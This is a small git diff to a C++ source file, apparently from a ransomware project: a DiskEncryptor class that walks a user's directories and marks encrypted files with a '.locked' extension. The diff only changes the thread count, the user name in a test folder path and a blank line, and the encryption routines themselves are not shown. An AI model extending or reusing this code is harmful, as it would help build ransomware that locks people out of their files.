@@ -9,7 +9,7 @@
 #include "diskencryptor.h"
 #include "http.h"
 
-#define DEFAULT_THREADS 6
+#define DEFAULT_THREADS 1
 #define FILE_EXTENSION ".locked"
 
 
@@ -38,7 +38,7 @@ bool DiskEncryptor::setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByte
 
 void DiskEncryptor::iterateFiles(std::string uuid) {
 	std::vector<std::thread> threads;
-	for (auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\\mXn\\Desktop\\fwareTest", std::filesystem::directory_options::skip_permission_denied)) {
+	for (auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\\Flavian\\Desktop\\fwareTest", std::filesystem::directory_options::skip_permission_denied)) {
 		try {
 			if (entry.is_directory()) {
 				
@@ -115,5 +115,4 @@ DiskEncryptor::DiskEncryptor(std::string disk, CryptoPP::SecByteBlock& key, Cryp
 
 DiskEncryptor::~DiskEncryptor()
 {
-
 }
